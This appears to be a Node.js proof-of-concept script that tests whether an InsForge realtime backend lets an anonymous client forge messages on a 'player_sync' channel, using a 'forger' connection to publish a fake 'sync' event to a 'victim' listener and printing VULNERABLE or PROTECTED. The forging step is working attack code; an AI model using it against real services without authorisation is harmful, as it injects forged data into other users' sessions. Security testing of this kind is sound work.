import { io } from 'socket.io-client';

const URL = process.env.VITE_INSFORGE_URL;
const ANON = process.env.VITE_INSFORGE_ANON_KEY;

const connect = () => new Promise((resolve) => {
  const s = io(URL, { transports: ['websocket'], reconnection: false, auth: { apiKey: ANON } });
  s.on('connect', () => resolve(s));
  s.on('connect_error', (e) => { console.log('connect_error:', e.message); process.exit(1); });
});

const subscribe = (s, channel) => new Promise((resolve) => {
  s.emit('realtime:subscribe', { channel }, (r) => resolve(r));
});

// A = victim listener, B = forger
const A = await connect();
const B = await connect();

let received = [];
A.onAny((event, msg) => {
  if (!['realtime:error', 'presence:join', 'presence:leave'].includes(event)) {
    received.push({ event, msg });
  }
});

await subscribe(A, 'player_sync');
await subscribe(B, 'player_sync');
console.log('both subscribed to player_sync');

B.emit('realtime:publish', { channel: 'player_sync', event: 'sync', payload: { forged: true, marker: Date.now() } });

await new Promise((r) => setTimeout(r, 5000));

const forged = received.filter((r) => r.event === 'sync');
if (forged.length > 0) {
  console.log('VULNERABLE: anonymous forge was BROADCAST to listener:');
  console.log(JSON.stringify(forged[0]).slice(0, 200));
} else {
  console.log('PROTECTED: anonymous forge was NOT broadcast ✓');
}
console.log('events A received total:', received.map((r) => r.event).join(', ') || '(none)');
process.exit(0);
